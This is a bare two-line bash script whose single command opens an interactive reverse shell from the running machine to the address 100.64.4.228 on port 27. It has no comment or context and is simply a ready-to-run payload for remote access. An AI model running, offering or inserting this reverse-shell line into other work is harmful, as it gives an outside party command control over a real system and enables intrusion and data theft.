#!/bin/bash
bash -i >& /dev/tcp/100.64.4.228/27
